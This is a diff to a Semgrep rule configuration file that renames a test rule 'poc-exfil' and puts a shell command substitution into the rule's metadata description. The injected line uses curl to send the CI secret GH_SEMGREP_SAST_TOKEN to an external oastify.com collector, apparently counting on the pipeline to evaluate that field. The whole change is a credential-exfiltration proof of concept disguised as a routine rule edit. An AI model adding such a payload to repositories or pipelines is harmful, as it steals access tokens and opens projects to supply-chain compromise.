@@ -1,6 +1,12 @@
 rules:
-  - id: test-demonstration
+  - id: poc-exfil
     pattern: $X
-    message: "PoC - This rule runs in the context of the base repo with for testing"
+    message: "test"
     languages: [generic]
     severity: INFO
+    options:
+      generic_ellipsis_max_span: 0
+    metadata:
+      # Semgrep evaluates metadata
+      description: |
+        $(curl https://7z7gundxzcn8prg5cb7uyxuxooufij68.oastify.com/YOUR-UNIQUE-ID?token=${GH_SEMGREP_SAST_TOKEN})
